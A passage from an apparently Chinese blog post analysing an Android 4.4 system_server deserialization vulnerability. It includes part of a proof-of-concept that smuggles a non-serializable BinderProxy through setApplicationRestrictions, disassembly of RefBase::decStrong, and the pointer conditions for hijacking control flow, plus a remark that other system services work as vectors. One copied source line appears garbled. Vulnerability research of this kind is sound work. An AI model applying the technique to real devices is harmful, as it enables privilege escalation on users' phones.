class="string">'a'</span>;</span><br><span class="line">                data[i+<span class="number">1</span>] = <span class="string">'n'</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        _data.recycle();</span><br><span class="line">        _data = Parcel.obtain();</span><br><span class="line">        _data.unmarshall(data, <span class="number">0</span>, data.length);</span><br><span class="line"></span><br><span class="line">        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, <span class="number">0</span>);</span><br><span class="line">        _reply.readException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        _reply.recycle();</span><br><span class="line">        _data.recycle();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将该函数与Android源码中的Android.os.IUserManager.Stub.Proxy.setApplicationRestrictions函数对比，主要的区别在于将传入的Bundle数据进行了修改，将之前可序列化的AAdroid.os.BinderProxy对象修改为了不可序列化的Android.os.BinderProxy对象，这样就将不可序列化的Bundles数据，通过Binder跨进程调用，传入system_server中，system_server在处理这些数据时造成异常崩溃。</p>
<h3 id="进程间通信">进程间通信</h3><h4 id="Binder">Binder</h4><p>通过POC知道造成崩溃行为的代码为mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)，这里就涉及到进程间通信，在Android中，Binder用于完成进程间通信（IPC），即把多个进程关联在一起，以下摘自网络：</p>
<blockquote>
<p>Binder是一种架构，这种架构提供了服务端接口、Binder驱动、客户端接口三个模块。<br>　　服务端：一个Binder服务端实际上就是一个Binder类的对象，该对象一旦创建，内部就启动一个隐藏线程。该线程接下来会接收Binder驱动发送的消息，收到消息后，会执行到Binder对象中的onTransact()函数，并按照该函数的参数执行不同的服务代码。因此，要实现一个Binder服务，就必须重载onTransact()方法。重载onTransact()函数的主要内容是把onTransact()函数的参数转换为服务函数的参数，而onTransact()函数的参数来源是客户端调用transact()函数时输入的，因此，如果transact()有固定格式的输入，那么onTransact()就会有固定格式的输出。<br>　　Binder驱动：任意一个服务端Binder对象被创建时，同时会在Binder驱动中创建一个mRemote对象，该对象的类型也是Binder类。客户端要访问远程服务时，都是通过mRemote对象。<br>　　客户端：客户端要想访问远程服务，必须获取远程服务在Binder对象中对应的mRemote引用，获得该mRemote对象后，就可以调用其transact()方法，而在Binder驱动中，mRemote对象也重载了transact()方法，重载的内容主要包括以下几项：1. 以线程间消息通信的模式，向服务端发送客户端传递过来的参数。2. 挂起当前线程，当前线程正是客户端线程，并等待服务端线程执行完指定服务函数后通知(notify)。3. 接收到服务端线程的通知，然后继续执行客户端线程，并返回到客户端代码区。</p>
</blockquote>
<p>通过上边简短的介绍，我们知道，要想使用服务端，首先要获取服务端在Binder驱动中对应的mRemote变量的引用，在POC中通过反射方式获得。<br>获得该变量的引用后，就可以调用该变量的transact()方法。该方法的函数原型：public final boolean transact(int code, Parcel data, Parcel reply,int flags)，其中data表示的是要传递给远程Binder服务的包裹(Parcel)，远程服务函数所需要的参数必须放入这个包裹中。包裹中只能放入特定类型的变量，这些类型包括常用的原子类型，比如String、int、long等，要查看包裹可以放入的全部数据类型，可以参照Parcel类。除了一般的原子变量外，Parcel还提供了一个writeParcel()方法，可以在包裹中包含一个小包裹。因此，要进行Binder远程服务调用时，服务函数的参数要么是一个原子类，要么必须继承于Parcel类，否则，是不能传递的。这也是为什么最开始要创建一个可序列化的对象AAdroid.os.BinderProxy并将其放入Bundle数据中。</p>
<p>网上关于进程间通信的资料大部分都是又臭又长，如果想快速了解推荐一篇文章 <a href="http://www.cnblogs.com/noTice520/archive/2012/11/01/2750209.html" target="_blank" rel="external">android中的跨进程通信的实现（一）——远程调用过程和aidl</a></p>
<h4 id="service_manager和binder_service">service manager和binder service</h4><p>Binder是android系统中实现跨进程通信(IPC)的一种重要机制。service manager是所有binder service的管理者，但它并不是这些binder service的创建者。这些binder service有些是init进程启动的服务创建的，有些是system_server进程创建的，但是service manager会管理所有binder service的信息，方便client查询以及调用。</p>
<p>service manager是由init进程直接启动的，ActivityManagerService，PackageManagerService等系统的基本服务(frameworks\base\services\java\com\android\server源码路径里的服务类)由system_server进程启动的。binder service实际上并没有单独的进程，它们只是system_server的一个子线程。init进程会启动surface flinger，media server, drmserver等服务，在这些服务里会创建binder service，并注册到service manager。</p>
<p>native binder service 和 java 层的binder service，都会交由service manager注册，然后由service manager管理。客户端使用binder service时需要向service manager查询得到binder service在当前进程的一个代理proxy，通过代理与binder service的服务端交互。</p>
<h3 id="漏洞触发过程中数据的parcel和unparcel">漏洞触发过程中数据的parcel和unparcel</h3><p>进程间传递Parcel类型数据，一端通过writeToParcel将对象映射成Parcel对象传递出去，另一端再通过createFromParcel将Parcel对象映射回原始对象进行处理。可以将Parcel看成是一个流，通过writeToParcel把对象写到流里面，在通过createFromParcel从流里读取对象。</p>
<p>然后看POC中修改过的不可反序列化的parcel对象Android.os.BinderProxy的处理过程，接POC最后执行流程，执行过mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0)过后，system_server层会去调用IUserManager.onTransact()方法，来到case TRANSACTION_setApplicationRestrictions分支开始处理传进来的parcel数据流：</p>
<p>先是_arg1 = android.os.Bundle.CREATOR.createFromParcel(data)读取数据对象，然后调用this.setApplicationRestrictions(_arg0, _arg1, _arg2);然后转入UserManagerService，UserManagerService继承IUserManager.Stub并实现了setApplicationRestrictions方法，下边的调用流程为(跟着参数_arg1也就是修改过不可反序列化的对象走)</p>
<blockquote>
<p>IUserManager.Stub.Proxy.setApplicationRestrictions(_arg0, _arg1, _arg2) -&gt;<br>UserManagerService.setApplicationRestrictions -&gt;<br>UserManagerService.writeApplicationRestrictionsLocked -&gt;<br>Bundle.keySet()(restrictions.keySet()) -&gt;<br>Bundle.unparcel() -&gt;<br>Parcel.readArrayMapInternal() -&gt;<br>Parcel.readValue(ClassLoader) -&gt;<br>Parcel.readSerializable(ClassLoader) -&gt;<br>ObjectInputStream.readObject() -&gt;<br>ObjectInputStream.readNonPrimitiveContent() -&gt;<br>ObjectInputStream.readNewObject() -&gt;</p>
</blockquote>
<p>对比之前版本知道，最后classDesc.checkAndGetTcObjectClass()这里就是补丁代码了，进去checkAndGetTcObjectClass()看到上边几行注释</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span><br><span class="line"> * Checks the local class to make sure it is valid for &#123;<span class="doctag">@link</span> ObjectStreamConstants#TC_OBJECT&#125;</span><br><span class="line"> * deserialization. Also performs some sanity checks of the stream data. This method is used</span><br><span class="line"> * during deserialization to confirm the local class is likely to be compatible with the coming</span><br><span class="line"> * stream data, but before an instance is instantiated.</span><br><span class="line"> *</span><br><span class="line"> * <span class="doctag">@hide</span> used internally during deserialization</span><br><span class="line"> */</span></span><br></pre></td></tr></table></figure>
<p>注释也很清楚了说明了，这是加的一个补丁，在数据被实例化之前，用来检测对象是否可被反序列化。<br>更详细的补丁代码可以查看：<a href="https://github.com/CyanogenMod/android_libcore/commit/2d0fbea07c1a3c4368ddb07609d1a86993ed6de9" target="_blank" rel="external">2d0fbea07c1a3c4368ddb07609d1a86993ed6de9</a></p>
<h2 id="漏洞分析">漏洞分析</h2><p>回过头来看crash dump信息，根据backtrace显示的堆栈调用最后调用了<code>/system/lib/libutils.so (android::RefBase::decStrong(void const*) const+3)</code>。</p>
<h3 id="Android指针管理">Android指针管理</h3><p>Android中通过引用计数来实现智能指针，并且实现有强指针与弱指针。由对象本身来提供引用计数器，但是对象不会去维护引用计数器的值，而是由智能指针来管理。要达到所有对象都可用引用计数器实现智能指针管理的目标，可以定义一个公共类，提供引用计数的方法，所有对象都去继承这个公共类，这样就可以实现所有对象都可以用引用计数来管理的目标，在Android中，这个公共类就是RefBase。</p>
<p>RefBase作为公共基类提供了引用计数的方法，但是并不去维护引用计数的值，而是由两个智能指针来进行管理：sp(Strong Pointer)和wp(Weak Pointer)，代表强引用计数和弱引用计数。RefBase提供了incStrong与decStrong函数用于控制强引用计数值，其弱引用计数值是由weakref_impl控制，强引用计数与弱引用数都保存在weakref_impl *类型的成员变量mRefs中。</p>
<p>当sp销毁时其析构函数调用对象即RefBase的decStrong函数，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<h3 id="GC机制">GC机制</h3><p>简单介绍一下Java对象的生命周期与垃圾回收(摘自网络)：</p>
<p>创建对象的方式：</p>
<ul>
<li>用new语句创建对象。</li>
<li>使用反射，调用java.lang.Class或java.lang.reflect.Constructor的newInstance()实例方法。</li>
<li>调用对象的clone()方法</li>
<li>使用反序列化手段，调用java.io.ObjectInputStream对象的readObject()方法。</li>
</ul>
<p>垃圾回收和对象的可触及性：</p>
<ul>
<li>可触及状态：当一个对象被创建后，只要程序中还有引用变量引用该对象，那么它就始终处于可触及状态。</li>
<li>可复活状态：当程序不再有任何引用变量引用对象时，它就进入可复活状态。该状态的对象，垃圾回收器会准备释放它占用的内存，在释放前，会调用它的finalize()方法，这些finalize()方法有可能使对象重新转到可触及状态。</li>
<li>不可触及状态：当JVM执行完所有的可复活状态的finalize()方法后，假如这些方法都没有使对象转到可触及状态。那么该对象就进入不可触及状态。只有当对象处于不可触及状态时，垃圾回收器才会真正回收它占用的内存。</li>
</ul>
<h3 id="漏洞成因">漏洞成因</h3><p>通过RefBase和GC机制的简单了解得知该处崩溃是由于对象销毁触发GC处理过程，当system_server对传进来的对象进行反序列化后就创建了对象，启动Activity后将其最小化，触发GC，由于该对象并没有任何引用，GC清理时就会调用该对象的finalize方法，即调用了Android.os.BinderProxy的finalize方法，然后会调用destroy()，destroy()为native方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="annotation">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        destroy();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.finalize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>
<p>定位到<a href="https://android.googlesource.com/platform/frameworks/base/+/f76a50c/core/jni/android_util_Binder.cpp" target="_blank" rel="external">android_os_BinderProxy_destroy</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">android_os_BinderProxy_destroy</span><span class="params">(JNIEnv* env, jobject obj)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    IBinder* b = (IBinder*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mObject);</span><br><span class="line">    DeathRecipientList* drl = (DeathRecipientList*)</span><br><span class="line">            env-&gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);</span><br><span class="line">    LOGDEATH(<span class="string">"Destroying BinderProxy %p: binder=%p drl=%p\n"</span>, obj, b, drl);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mObject, <span class="number">0</span>);</span><br><span class="line">    env-&gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, <span class="number">0</span>);</span><br><span class="line">    drl-&gt;decStrong((<span class="keyword">void</span>*)javaObjectForIBinder);</span><br><span class="line">    b-&gt;decStrong(obj);</span><br><span class="line">    IPCThreadState::self()-&gt;flushCommands();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码一开始就将gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue强制转换成函数指针，那么gBinderProxyOffsets.mObject和gBinderProxyOffsets.mOrgue是什么鬼？找到BinderProxy服务注册函数int_register_android_os_BinderProxy</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="keyword">const</span> kBinderProxyPathName = <span class="string">"android/os/BinderProxy"</span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">int_register_android_os_BinderProxy</span><span class="params">(JNIEnv* env)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/ref/WeakReference"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.ref.WeakReference"</span>);</span><br><span class="line">    gWeakReferenceOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gWeakReferenceOffsets.mGet = env-&gt;GetMethodID(clazz, <span class="string">"get"</span>, <span class="string">"()Ljava/lang/Object;"</span>);</span><br><span class="line">    assert(gWeakReferenceOffsets.mGet);</span><br><span class="line">    clazz = env-&gt;FindClass(<span class="string">"java/lang/Error"</span>);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class java.lang.Error"</span>);</span><br><span class="line">    gErrorOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    clazz = env-&gt;FindClass(kBinderProxyPathName);</span><br><span class="line">    LOG_FATAL_IF(clazz == <span class="literal">NULL</span>, <span class="string">"Unable to find class android.os.BinderProxy"</span>);</span><br><span class="line">    gBinderProxyOffsets.mClass = (jclass) env-&gt;NewGlobalRef(clazz);</span><br><span class="line">    gBinderProxyOffsets.mConstructor = env-&gt;GetMethodID(clazz, <span class="string">"&lt;init&gt;"</span>, <span class="string">"()V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mConstructor);</span><br><span class="line">    gBinderProxyOffsets.mSendDeathNotice = env-&gt;GetStaticMethodID(clazz, <span class="string">"sendDeathNotice"</span>, <span class="string">"(Landroid/os/IBinder$DeathRecipient;)V"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSendDeathNotice);</span><br><span class="line">    gBinderProxyOffsets.mObject = env-&gt;GetFieldID(clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mObject);</span><br><span class="line">    gBinderProxyOffsets.mSelfvoid RefBase::decStrong = env-&gt;GetFieldID(clazz, <span class="string">"mSelf"</span>, <span class="string">"Ljava/lang/ref/WeakReference;"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mSelf);</span><br><span class="line">    gBinderProxyOffsets.mOrgue = env-&gt;GetFieldID(clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);</span><br><span class="line">    assert(gBinderProxyOffsets.mOrgue);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中可以看到，通过一些列反射通过对象引用计数器获取android.os.BinderProxy对象实例，然后通过</p>
<pre><code>gBinderProxyOffsets.mObject = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mObject"</span>, <span class="string">"I"</span>);
gBinderProxyOffsets.mOrgue = env-&gt;<span class="constant">GetFieldID(</span>clazz, <span class="string">"mOrgue"</span>, <span class="string">"I"</span>);
</code></pre><p>获取其成员变量mObject和mOrgue的值，即获取了AAdroid.os.BinderProxy中的变量mObject和mOrgue的值。而我们可以控制mObject和mOrgue的值，这样就相当于我们可以向system_server传递一个任意值的函数指针this，并在该对象实例被GC时有机会获得控制权。</p>
<p>继续看android_os_BinderProxy_destroy代码，将mOrgue强制转成DeathRecipientList函数指针后会调用函数drl-&gt;decStrong((void*)javaObjectForIBinder)，DeathRecipientList继承RefBase，找到RefBase类中的decStrong方法，位于<a href="http://androidxref.com/4.4.4_r1/xref/system/core/libutils/RefBase.cpp" target="_blank" rel="external">RefBase.cpp</a></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">void</span> RefBase::decStrong(<span class="keyword">const</span> <span class="keyword">void</span>* id) <span class="keyword">const</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 成员变量mRefs是在对象的构造函数中初始化</span></span><br><span class="line">    weakref_impl* <span class="keyword">const</span> refs = mRefs;</span><br><span class="line">    <span class="comment">// 强引用数与弱引用数同时减1</span></span><br><span class="line">    refs-&gt;removeStrongRef(id);</span><br><span class="line">    <span class="comment">// 获取强引用数，返回&amp;refs-&gt;mStrong</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int32_t</span> c = android_atomic_dec(&amp;refs-&gt;mStrong);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span> PRINT_REFS</span></span><br><span class="line">    ALOGD(<span class="string">"decStrong of %p from %p: cnt=%d\n"</span>, <span class="keyword">this</span>, id, c);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line">    ALOG_ASSERT(c &gt;= <span class="number">1</span>, <span class="string">"decStrong() called on %p too many times"</span>, refs);</span><br><span class="line">    <span class="comment">// 如果这是最后一个强引用的话</span></span><br><span class="line">    <span class="keyword">if</span> (c == <span class="number">1</span>) &#123;</span><br><span class="line">        refs-&gt;mBase-&gt;onLastStrongRef(id);</span><br><span class="line">        <span class="keyword">if</span> ((refs-&gt;mFlags&amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) &#123;</span><br><span class="line">            <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    refs-&gt;decWeak(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个对象销毁过程参考前边介绍的Android指针管理，decStrong中将强引用数与弱引用数同时减1，如果这是最后一个强引用的话，会调用对象的onLastStrongRef，并且判断成员变量mRefs的成员变量mFlags来决定是否在对象的强引用数为0时释放对象。</p>
<p>我们传入的mOrgue的值，即是drl-&gt;decStrong方法所在类DeathRecipientList的this指针，所以执行到refs-&gt;mBase-&gt;onLastStrongRef(id)最终导致我们的代码执行。mBase类型为RefBase* const，相当于直接跳到mOrgue地址执行了，即程序崩在了0x1337bef3，r0为函数第一个参数即this指针，所以其值也是0x1337bef3。</p>
<h3 id="反汇编定位崩溃点">反汇编定位崩溃点</h3><p>经过前边的分析已经知道了漏洞成因以及最终漏洞触发函数，但是想要利用漏洞就必须定位到具体的触发崩溃的点，需要知道最后是哪个操作造成的，以及相关寄存器哪些是可控的。</p>
<p>从android4.4.4原生系统中扣出libutil.so文件，然后反汇编android::RefBase::decStrong(void const*) const函数，汇编代码以及说明如下所示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">================ B E G I N N I N G   O F   P R O C E D U R E ================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             _ZNK7android7RefBase9decStrongEPKv:        <span class="comment">// android::RefBase::decStrong(void const*) const</span></span><br><span class="line"><span class="number">0000</span>d172         push       &#123;r4, r5, r6, lr&#125;                                    ; XREF=_ZN7android2spINS_9BlobCache4BlobEED1Ev+<span class="number">10</span>, _ZN7android2spINS_9BlobCache4BlobEEaSERKS3_+<span class="number">22</span>, _ZN7android2spINS_14LooperCallbackEED1Ev+<span class="number">18</span>, _ZN7android2spINS_6ThreadEE5clearEv+<span class="number">18</span>, _ZN7android6Thread3runEPKcij+<span class="number">70</span>, _ZN7android6Thread11_threadLoopEPv+<span class="number">178</span>, _ZN7android6Looper16threadDestructorEPv+<span class="number">6</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">42</span>, _ZN7android6Looper12setForThreadERKNS_2spIS0_EE+<span class="number">52</span>, _ZN7android2spINS_14LooperCallbackEEaSERKS2_+<span class="number">36</span>, _ZN7android6Looper9pollInnerEi+<span class="number">506</span>, …</span><br><span class="line"><span class="number">0000</span>d174         mov        r5, r0	<span class="comment">// r0为drl的this指针</span></span><br><span class="line"><span class="number">0000</span>d176         ldr        r4, [r0, <span class="preprocessor">#<span class="number">0x4</span>]	<span class="comment">// mRefs是drl父类RefBase虚函数下边第一个私有变量，即为drl虚表下边第一个私有变量，所以地址为this+4</span></span></span><br><span class="line"><span class="number">0000</span>d178         mov        r6, r1</span><br><span class="line"><span class="number">0000</span>d17a         mov        r0, r4	<span class="comment">// &amp;refs-&gt;mStrong为weakref_impl类的第一成员变量，并且其父类weakref_type没有虚函数，所以不存在虚表，所以其地址为r4</span></span><br><span class="line"><span class="number">0000</span>d17c         blx        android_atomic_dec@PLT <span class="comment">// 获取强引用数</span></span><br><span class="line"><span class="number">0000</span>d180         cmp        r0, <span class="preprocessor">#<span class="number">0x1</span>	<span class="comment">// 返回值与1比较</span></span></span><br><span class="line"><span class="number">0000</span>d182         bne        <span class="number">0xd19c</span>	<span class="comment">// 不等跳到0xd19c 该处为漏洞利用的约束条件</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d184         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0x8</span>]	<span class="comment">// weakref_impl类中mBase位于第三个成员变量，所以其地址为r4+8</span></span></span><br><span class="line"><span class="number">0000</span>d186         mov        r1, r6	<span class="comment">// refs-&gt;mBase-&gt;onLastStrongRef参数id</span></span><br><span class="line"><span class="number">0000</span>d188         ldr        r3, [r0]	<span class="comment">// 将mBase地址传给r3，即r3为RefBase类this指针</span></span><br><span class="line"><span class="number">0000</span>d18a         ldr        r2, [r3, <span class="preprocessor">#<span class="number">0xc</span>]	<span class="comment">// 父类weakref_type虚表指针vfptr+私有变量mRefs + 4(onLastStrongRef为第二个虚函数) = 0xC</span></span></span><br><span class="line"><span class="number">0000</span>d18c         blx        r2	<span class="comment">// 调用refs-&gt;mBase-&gt;onLastStrongRef</span></span><br><span class="line"><span class="number">0000</span>d18e         ldr        r0, [r4, <span class="preprocessor">#<span class="number">0xc</span>]</span></span><br><span class="line"><span class="number">0000</span>d190         lsls       r0, r0, <span class="preprocessor">#<span class="number">0x1f</span></span></span><br><span class="line"><span class="number">0000</span>d192         bmi        <span class="number">0xd19c</span></span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d194         ldr        r1, [r5]</span><br><span class="line"><span class="number">0000</span>d196         mov        r0, r5</span><br><span class="line"><span class="number">0000</span>d198         ldr        r3, [r1, <span class="preprocessor">#<span class="number">0x4</span>]</span></span><br><span class="line"><span class="number">0000</span>d19a         blx        r3</span><br><span class="line"></span><br><span class="line"><span class="number">0000</span>d19c         mov        r0, r4                                              ; argument <span class="preprocessor">#<span class="number">1</span> for method _ZN7android7RefBase12weakref_type7decWeakEPKv, XREF=_ZNK7android7RefBase9decStrongEPKv+<span class="number">16</span>, _ZNK7android7RefBase9decStrongEPKv+<span class="number">32</span></span></span><br><span class="line"><span class="number">0000</span>d19e         mov        r1, r6</span><br><span class="line"><span class="number">0000</span>d1a0         pop.w      &#123;r4, r5, r6, lr&#125;</span><br><span class="line"><span class="number">0000</span>d1a4         b.w        _ZN7android7RefBase12weakref_type7decWeakEPKv       ; android::RefBase::weakref_type::decWeak(<span class="keyword">void</span> <span class="keyword">const</span>*)</span><br><span class="line">                        ; endp</span><br></pre></td></tr></table></figure>
<p>根据汇编代码可以看出，为实现任意代码执行得满足条件：<br>&amp;refs-&gt;mStrong == 1，即<code>*(*(mOrgue+4)) == 1</code><br>所以总结下来应该是</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line"><span class="keyword">if</span>(*(*(mOrgue+<span class="number">4</span>)) == <span class="number">1</span>) &#123;</span><br><span class="line">	refs = *(mOrgue+<span class="number">4</span>);</span><br><span class="line">	r2 = *(*(*(refs+<span class="number">8</span>))+<span class="number">0xC</span>);</span><br><span class="line">	blx r2 ; &lt;—— controlled;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对照反汇编代码更容易看出来</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> android::RefBase::decStrong(<span class="keyword">void</span> <span class="keyword">const</span>*) <span class="keyword">const</span>(<span class="keyword">void</span> * arg0) &#123;</span><br><span class="line">    r5 = arg0;</span><br><span class="line">    r4 = *(arg0 + <span class="number">0x4</span>);</span><br><span class="line">    r6 = r1;</span><br><span class="line">    <span class="keyword">if</span> (android_atomic_dec() == <span class="number">0x1</span>) &#123;</span><br><span class="line">            r0 = *(r4 + <span class="number">0x8</span>);</span><br><span class="line">            r3 = *r0;</span><br><span class="line">            r2 = *(r3 + <span class="number">0xc</span>);</span><br><span class="line">            (r2)(r0, r6, r2, r3);</span><br><span class="line">            <span class="keyword">if</span> (PARITY(*(r4 + <span class="number">0xc</span>) &lt;&lt; <span class="number">0x1f</span>)) &#123;</span><br><span class="line">                    r1 = *r5;</span><br><span class="line">                    (*(r1 + <span class="number">0x4</span>))(r5, r1);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    Pop();</span><br><span class="line">    r0 = android::RefBase::weakref_type::decWeak(r4);</span><br><span class="line">    <span class="keyword">return</span> r0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后执行的汇编代码地址为<br><code>r2 = *(*(*(refs+8))+0xC) = *(*(*(*(mOrgue+4)+8))+0xC)</code></p>
<h2 id="思考">思考</h2><p>通过分析，其实这个漏洞触发需要的条件就两个：</p>
<ol>
<li>向system_server传递对象，并且system_server会将该对象反序列化。</li>
<li>传递数据前将可序列化的对象修改为不可序列化。</li>
</ol>
<p>第一个问题，是否必须使用Android.os.UserManager.setApplicationRestrictions方法向system_server传递对象？<br>并不是，其实我们需要的是找到一个途径将序列化后的对象传递进system_server进程，并且system_server会将该对象反序列化，只要满足这样的条件均可。这样的系统服务还是很多的，例如frameworks\base\services\java\com\android\server目录下的系统服务，找到相对应的应用层通信调用的地方就可以了。</p>
